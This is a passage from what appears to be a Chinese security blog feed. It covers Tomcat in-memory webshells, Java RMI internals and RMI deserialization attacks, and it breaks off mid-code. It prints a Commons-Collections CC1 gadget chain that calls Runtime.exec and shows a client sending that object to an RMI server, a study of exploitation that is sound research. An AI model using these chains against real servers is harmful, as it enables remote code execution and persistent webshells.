title="others"></a>others</h2><p>至于为什么说是内存马，比如上面listenerTrojan.jsp访问一遍后，注册了listener。然后就可以把jsp删掉了，再访问上下文环境就能直接带上参数命令执行。只要服务器不重启就一直运行</p><p>不过上述内存马都不是真正意义上的内存马，它们会输出在tomcat的目录下</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229153959584"></p><p>比如上述运行的jsp，在CTALINA_BASE环境的<code>work\Catalina\localhost\Servlet_web环境\org\apache\jsp</code>都有相应的文件</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229154145023"></p><p>关于真正意义上的内存马注入：<a href="http://wjlshare.com/archives/1541">http://wjlshare.com/archives/1541</a></p><p>借助cc链进行内存马注入</p><p>参考：<a href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p><p><a href="https://paper.seebug.org/1441/#1_1">https://paper.seebug.org/1441/#1_1</a></p><p>参考了Ho1aAs的多篇文章：<a href="https://ho1aas.blog.csdn.net/article/details/124120724">https://ho1aas.blog.csdn.net/article/details/124120724</a></p><p><a href="https://ho1aas.blog.csdn.net/article/details/124120724">https://ho1aas.blog.csdn.net/article/details/124120724</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
            <tag> 内存马 </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI源码分析</title>
      <link href="/2022/11/24/rmi-yuan-ma-fen-xi/"/>
      <url>/2022/11/24/rmi-yuan-ma-fen-xi/</url>
      
        <content type="html"><![CDATA[<p>想学JDNI，那想必一定躲不过RMI。建议看过CC链后阅读</p><h1 id="RMI简述"><a href="#RMI简述" class="headerlink" title="RMI简述"></a>RMI简述</h1><p>RMI可以远程调用JVM对象并获取结果。所以需要一个server和一个client进行通信</p><p>Server端会创建一个远程对象用于client端远程访问</p><p>下面改造一张来自W3Cschool的图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207203208738.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207203208738.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221207203208738"></p><p>只需要知道：Client端使用stub来请求远程方法，而Server端用Skeleton来接收stub，然后将返回值传输给Client</p><ul><li><p>RMI server的构造需要:</p><ol><li><p>一个远程接口rmidemo，rmidemo需要继承java.rmi.Remote接口，其中的方法还需要有serializable接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">rmidemo</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6490921832856589236L</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>serialVersionUID是为了防止在序列化时导致版本冲突，所以序列化后UID不同会报异常</p></li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207215055661.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221207215055661.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221207215055661"></p><ol start="2"><li>能被远程访问的类RmiObject（需要继承UnicastRemoteObject类)，类必须实现rmidemo接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">rmidemo</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RmiObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>注册远程对象(RMIRegistry)：</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">rmidemo</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RmiObjct</span>();<span class="comment">//创建远程对象</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.rebind(<span class="string">&quot;hello&quot;</span>,hello);<span class="comment">//将远程对象注册到注册表里面，并且设置值为hello</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>RMI Client。LocateRegistry.getRegistry进行连接，用到lookup()搜索对应方法，然后调用需要的远程方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">clientdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);<span class="comment">//获取远程主机对象</span></span><br><span class="line">        <span class="comment">// 利用注册表的代理去查询远程注册表中名为hello的对象</span></span><br><span class="line">        <span class="type">rmidemo</span> <span class="variable">hello</span> <span class="operator">=</span> (rmidemo) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        System.out.println(hello.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>以上过程也可以用素十八大佬的一图概括：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221208215020587.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221208215020587.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221208215020587"></p><h2 id="RMI反序列化攻击"><a href="#RMI反序列化攻击" class="headerlink" title="RMI反序列化攻击"></a>RMI反序列化攻击</h2><p>以CC1链利用AnnotationInvocationHandler进行攻击为例：</p><p>CC1的POC为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> newChainedTransformer(transformers);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    innerMap.put(<span class="string">&quot;godown&quot;</span>,<span class="string">&quot;buruheshen&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,transformerChain);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当Server端存在远程接收Object对象时，可以发送序列化对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">rmidemo</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Registry时，rebind会进行反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        rmidemo user= <span class="keyword">new</span> <span class="title class_">RmiObject</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.rebind(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以把CC1构造的恶意对象，通过rmi协议连接到 接收对象的类，再向 接收对象的方法传恶意对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/user&quot;</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">userClient</span> <span class="operator">=</span> (User) Naming.lookup(url);</span><br><span class="line">        userClient.work(CommonsCollections1());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221208155516357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221208155516357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221208155516357"></p><h1 id="RMI源码分析"><a href="#RMI源码分析" class="headerlink" title="RMI源码分析"></a>RMI源码分析</h1><p>如果不想深入RMI的可以跳过这部分，直接看攻击</p><h2 id="Server端UnicastRemoteObject"><a href="#Server端UnicastRemoteObject" class="headerlink" title="Server端UnicastRemoteObject"></a>Server端UnicastRemoteObject</h2><p>在刚开始，我们定义了一个类rmiObject，它必须继承UnicastRemoteObject，那这个类有什么用？简而言之就是创建远程对象并put进ObjectTable+监听本地</p><p>该类readObject调用reexport:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112035631.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112035631.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209112035631">reexport又调用exportObject:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112108462.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112108462.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209112108462"></p><p>在reexport#exportObject中，如果没有UnicastServerRed参数会<code>new UnicastServerRef()</code>，并且exportObject该对象（这里的export是UnicastRemoteRef的方法)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112306197.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112306197.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209112306197"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112842524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209112842524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209112842524"></p><ul><li>UnicastServerRef的exportObject如下：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209144854214.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209144854214.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209144854214"></p><ol><li>用到了Util.creatProxy()进行动态代理：</li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209145140196.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209145140196.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209145140196"></p><p>​creatProxy使用RemoteObjectInvocationHandler，为rmidemo(远程接口)创建动态代理Proxy.newProxyInstance()</p><ol start="2"><li><p>使用Target对象封装 远程方法 和生成的动态代理类。var6也就是stub</p><blockquote><p>UnicastServerRef#this.ref.exportObject调用transport.liveRef的exportObject</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209150248476.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209150248476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209150248476"></p><p>跟进到liveRef#exportObject()，该exportObject指向了实现Endpoint接口的类，也就是TCPEndpoint()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209150924165.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209150924165.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209150924165"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209151116305.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209151116305.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209151116305"></p><p>TCPEndpoint#exportObject指向TCPTransport#exportObject</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209151504051.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209151504051.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209151504051"></p></blockquote><p>所以UnicastServerRef#this.ref.exportObject最终在TCPTransport#Object实现：负责监听本地端口</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209152034962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209152034962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209152034962"></p><p>super.exportObject()调用继承方法，TCPTransport的父类是Transport。</p><p>Transport()#exportObject把Target放入ObjectTable，用于管理Target</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209153055485.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209153055485.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209153055485"></p></li></ol><p>在createProxy()中用到的RemoteObjectInvocationHandler动态代理，该类继承了RemoteObject并实现了InvocationHandler。所以该类可远程传输、可序列化</p><h2 id="Registry端createRegistry-1099"><a href="#Registry端createRegistry-1099" class="headerlink" title="Registry端createRegistry(1099)"></a>Registry端createRegistry(1099)</h2><p>LocateRegistry.createRegistry(1099)&#x3D;&#x3D;new RegistryImpl(1099)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209160315006.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209160315006.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209160315006"></p><p>RegistryImpl调用了setup配置UnicastServerRef对象</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209160644409.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209160644409.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209160644409"></p><p>setup的exportObjec也是指向UnicastObjectRef类，exportObject依然是createProxy()创建动态代理</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209160738484.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209160738484.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209160738484"></p><p>不过由于最后一个参数为true，会调用UnicastServerRef#setSkeleton()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209161811893.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209161811893.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209161811893"></p><p>setSkeleton()执行Util#createSkeleton()创建skeleton:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209162109396.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209162109396.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209162109396"></p><p>createSkeleton()用forName和newInstance反射var2对象，var1初始来自RegistryImpl，拼接_Skel后就是返回RegistryImpl_Skel</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209162536268.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209162536268.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209162536268"></p><p>RegistryImpl_Skel类的dispatch会根据不同的写入操作switch不同的操作方式，比如bind就是case0</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209163253872.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209163253872.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209163253872"></p><p>后面的代码和Server一样，不过exportObject的对象从UnicastServerRef变成了RegistryImpl</p><h2 id="非Object参数RMI攻击"><a href="#非Object参数RMI攻击" class="headerlink" title="非Object参数RMI攻击"></a>非Object参数RMI攻击</h2><p>上面的RMI攻击环境是 Server端有接收Object参数的方法。那没有这种方法，服务端接收的是Object的子类，比如HelloObject作为参数，而我们构造的恶意类必须要是Object，该怎么办？</p><p>先来了解一下UnicastServerRef的dispatch方法。在客户端lookup远程调用方法时，Registry端执行RegistryImpl_Skel类的dispatch方法，然后将结果writeObject到序列化流：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221208223443040.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221208223443040.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221208223443040"></p><p>Client端获取到Registry端的序列化流后，进行反序列化。对其调用。</p><p>当Client端向Registry端请求远程对象时，lookup的值为2，Registry端使用<code>RegistryImpl_Skel#dispatch</code> case2。</p><p>Server端则是根据UnicastServerRef#dispatch来 来处理客户端请求，在hashToMethod_Map中寻找Method的hash</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209170905456.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209170905456.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209170905456"></p><p>如果找到了就进行反射调用</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209170923636.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221209170923636.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221209170923636"></p><p>这里的hash算法是SHA1。所以让method_hash相同的情况下就能进行反射调用。在debug时RemoteObjectInvocationHandler的invokeRemoteMethod处下断点，将Method改为服务器需要的Method，hash就会跟着改变，但是恶意类已经生成</p><p>参考：<a href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></p><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> RMI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RMI </tag>
            
            <tag> RMI源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI攻击</title>
      <link href="/2022/11/21/rmi-gong-ji/"/>
      <url>/2022/11/21/rmi-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="RMI原理"><a href="#RMI原理" class="headerlink" title="RMI原理"></a>RMI原理</h2><p>这方面的东西就不多说了，看RMI流程图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210154646704.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210154646704.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221210154646704"></p><p>其中存根stub是客户端的代理，骨架skeleton是服务器代理</p><ol><li><p>创建远程对象。<code>ServiceImpl service = new ServiceImpl();</code></p></li><li><p>注册远程对象。<code>Naming.bind(&quot;rmi:127.0.0.1:1099/service&quot;,service);</code>(service为ServiceImpl定义的远程对象)</p></li><li><p>客户端访问服务器并查找远程对象。包括两个步骤：</p><p>①用interface定义要查找的远程对象，在第四步作为引用：<code>ServiceInterface service = (ServiceInterface);</code></p><p>②查找远程对象。<code>Naming.lookup(&quot;rmi://127.0.0.1:1099/service&quot;)</code></p></li><li><p>Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub</p></li><li><p>调用远程方法。比如<code>String rep = service.cxk(&quot;ctrl&quot;);</code></p></li><li><p>客户端存根和服务器骨架通信</p></li><li><p>骨架代理调用<code>service.cxk(&quot;ctrl&quot;);</code>，实际上是在Server端调用的</p></li><li><p>骨架把结果返回给存根</p></li><li><p>存根把结果返回给客户端</p></li></ol><p>其中存根stub在客户端，skeleton是服务端本身的远程对象(service本尊)</p><p>知道这些就可以了，深入分析见（我的上一篇 RMI源码分析）<a href="https://www.freebuf.com/articles/web/352122.html%EF%BC%8C%E6%9B%B4%E6%B7%B1%E4%B8%80%E6%AD%A5%E7%9B%B4%E6%8E%A5%E7%9C%8Bhttps://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93">https://www.freebuf.com/articles/web/352122.html，更深一步直接看https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93</a></p><h1 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h1><p>观察一下RMI流程中有哪些地方进行了反序列化</p><ol><li>Server进行Naming.bind时，registry对service会进行反序列化</li><li>client进行lookup时，registry对实现了ServiceInterface的service进行反序列化，client接收返回的service也要进行反序列化</li><li>client调用远程方法时，server对<strong>参数ctrl</strong>反序列化，client对server的结果也要反序列化</li></ol><p>因此可以根据这几个反序列化入口攻击Server、Client、Registry。</p><h2 id="攻击Registry端"><a href="#攻击Registry端" class="headerlink" title="攻击Registry端"></a>攻击Registry端</h2><p>入口点为Naming.bind，绑定恶意对象时触发。</p><p>以CC1为例，使用AnnotationInvocationHandler类，但是bind()只能接收Remote类的子类。可以用Remote.class.cast强制转换为Remote类：</p><p><code>A.class.cast(B);</code> 将B类强制转化为A类,不过会抛出异常</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210164534166.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221210164534166.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221210164534166"></p><p>需要用到代理把AnnotationInvocationHandler代理为remote</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> 